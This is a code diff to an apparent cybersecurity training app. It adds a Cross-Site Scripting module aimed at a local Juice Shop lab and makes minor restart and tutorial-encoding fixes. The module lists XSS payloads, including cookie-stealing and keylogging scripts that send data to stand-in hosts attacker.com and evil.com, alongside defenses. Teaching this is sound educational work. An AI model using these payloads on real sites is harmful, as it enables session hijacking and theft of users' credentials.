@@ -298,6 +298,50 @@ const MODULES = [
     ['-e nsr',       'Try null password, same-as-login, and reversed login','hydra ... -e nsr'],
     ['-C FILE',      'Colon-separated "user:pass" combo file',             'hydra ... -C combos.txt ssh://target']
   ]}
+},
+
+// ─────────────────────────────────────────────────────────────────────────────
+// MODULE 6: Cross-Site Scripting (XSS)
+// ─────────────────────────────────────────────────────────────────────────────
+{
+  id: 'xss', num: '06',
+  title: 'Cross-Site Scripting (XSS)',
+  subtitle: 'Learn how injecting malicious client-side scripts can hijack user sessions and manipulate web pages.',
+  tag: 'Module 6 \u2014 Client-Side Attacks',
+
+  concept: [
+    '<strong>Cross-Site Scripting (XSS)</strong> occurs when an application includes untrusted data in a web page without proper validation or escaping. This allows an attacker to execute malicious JavaScript in the victim\'s browser.',
+    '<strong>Reflected XSS</strong> happens when user input is immediately returned (reflected) by the web application in an error message, search result, or any other response. The payload is typically delivered via a crafted link.',
+    '<strong>Stored XSS</strong> (Persistent) is more dangerous. The malicious script is saved on the target server (e.g., in a database via a comment or profile field) and executed every time a user views the infected page.',
+    '<strong>DOM-based XSS</strong> occurs entirely in the browser when client-side JavaScript takes data from an attacker-controllable source (like the URL hash) and passes it to a dangerous sink (like <code>innerHTML</code> or <code>eval()</code>).'
+  ],
+
+  analogy: { emoji: '\uD83C\uDFAD', text: 'Imagine putting up a poster on a community noticeboard. Normally, you just write text. But if the noticeboard doesn\'t restrict what you pin up, you could pin a magical set of instructions that hypnotize anyone who reads them. When a victim looks at the board, they unknowingly execute your instructions \u2014 perhaps handing over their wallet. XSS is injecting those magical instructions (JavaScript) into a webpage.' },
+
+  steps: [
+    { title: 'Reflected XSS via Search', desc: 'In Juice Shop, the search bar reflects your input directly into the page. Try searching for an HTML tag like <code>&lt;h1&gt;Test&lt;/h1&gt;</code>. If the text renders as a heading, HTML is being interpreted. Now try an iframe payload:', code: { lang: 'html', text: '<iframe src="javascript:alert(\'xss\')">' } },
+    { title: 'DOM XSS via URL Hash', desc: 'Juice Shop\'s Angular frontend processes the URL hash client-side. If this data is unsafely rendered into the DOM, it creates a DOM XSS vector. Try navigating to this URL directly:', code: { lang: 'url', text: 'http://localhost:3000/#/search?q=<iframe src="javascript:alert(\'xss\')">' } },
+    { title: 'Stored XSS via Feedback', desc: 'Navigate to the Customer Feedback section. Enter an XSS payload in the comment field. The script is saved to the database and will trigger whenever the feedback is viewed (e.g., by an admin in the Administration panel).', code: { lang: 'html', text: '<script>alert("Stored XSS via Feedback!")</script>' } },
+    { title: 'Stealing Cookies', desc: 'The most common real-world XSS goal is stealing session cookies. An attacker writes a script that reads <code>document.cookie</code> and sends it to their own server, effectively hijacking the victim\'s session.', code: { lang: 'html', text: '<script>fetch("http://attacker.com/steal?cookie=" + btoa(document.cookie))</script>' } },
+    { title: 'Keylogging via XSS', desc: 'Advanced XSS payloads can silently capture keystrokes on the infected page. The attacker injects an event listener that forwards every key pressed to their server.', code: { lang: 'javascript', text: 'document.addEventListener("keypress", function(e) {\\n  fetch("http://attacker.com/log?k=" + e.key);\\n});' } }
+  ],
+
+  defense: [
+    { title: 'Context-Aware Output Encoding', desc: 'Never trust user input. Before rendering data in the browser, encode it according to where it will be placed (HTML body, attribute, JavaScript variable). Use framework features like React or Angular that auto-escape by default.' },
+    { title: 'Content Security Policy (CSP)', desc: 'A strict CSP prevents the browser from executing inline scripts and restricts where external scripts can be loaded from. It acts as a defense-in-depth layer against XSS.' },
+    { title: 'HttpOnly Cookies', desc: 'Set the <code>HttpOnly</code> flag on session cookies. This prevents client-side JavaScript (and therefore XSS attacks) from accessing the cookie.' },
+    { title: 'Sanitization', desc: 'If you must allow users to submit rich text (HTML), use a robust sanitization library like DOMPurify to strip out dangerous tags and attributes (like <code>&lt;script&gt;</code> or <code>onerror</code>).' }
+  ],
+
+  payloads: { headers: ['Payload', 'Type / Purpose', 'Description'], rows: [
+    ['&lt;script&gt;alert(1)&lt;/script&gt;',             'Basic',        'The classic proof of concept. Executes a simple alert box.'],
+    ['&lt;img src=x onerror=alert(1)&gt;',                'Image Vector', 'Executes JavaScript when the browser fails to load the fake image source.'],
+    ['&lt;iframe src="javascript:alert(1)"&gt;',           'Iframe',       'Executes script within an iframe. Often bypasses basic regex filters.'],
+    ['&lt;svg onload=alert(1)&gt;',                       'SVG Vector',   'Executes script when the SVG element finishes loading.'],
+    ['"&gt;&lt;script&gt;alert(1)&lt;/script&gt;',        'Break Out',    'Closes an existing HTML attribute/tag before injecting the payload.'],
+    ['javascript:alert(1)',                                'URI Scheme',   'Used in href or src attributes that expect a URL.'],
+    ['&lt;script&gt;fetch("http://evil.com/?c="+document.cookie)&lt;/script&gt;', 'Exfiltration', 'Steals the session cookie and sends it to the attacker.']
+  ]}
 }
 
 ]; // end MODULES
@@ -699,6 +743,18 @@ async function handleRestart() {
     btnRestart.disabled = true;
   }
   
+  // Reset overlay progress so Juice Shop and UI are completely fresh
+  localStorage.removeItem('cybercompanion_progress');
+  if (window.__overlay && window.__overlay.stateManager && window.__overlay.renderer) {
+    window.__overlay.stateManager.solvedChallenges.clear();
+    window.__overlay.stateManager.totalXP = 0;
+    window.__overlay.stateManager.recalculateLevel();
+    const overlayContentEl = document.getElementById('overlayContent');
+    if (overlayContentEl) {
+      window.__overlay.renderer.renderProgressDashboard(overlayContentEl);
+    }
+  }
+
   await handleStop();
   await handleBoot();
   
@@ -926,10 +982,15 @@ function startTutorial(tutorialKey) {
     }
   `;
   
+  // Double-encode steps: JSON.stringify twice produces a safe JS string literal
+  // (no backticks can escape the template literal), then JSON.parse inside the
+  // injected code decodes it back to the original array.
+  const safeStepsLiteral = JSON.stringify(JSON.stringify(tut.steps));
+
   const tutorialEngineCode = `
 (function() {
   if (window.__cyberTutorialEngine) {
-    window.__cyberTutorialEngine.play(${JSON.stringify(tut.steps)});
+    window.__cyberTutorialEngine.play(JSON.parse(${safeStepsLiteral}));
     return;
   }
 
@@ -1101,7 +1162,7 @@ function startTutorial(tutorialKey) {
   };
 
   window.__cyberTutorialEngine = engine;
-  engine.play(${JSON.stringify(tut.steps)});
+  engine.play(JSON.parse(${safeStepsLiteral}));
 })();
 `;
 
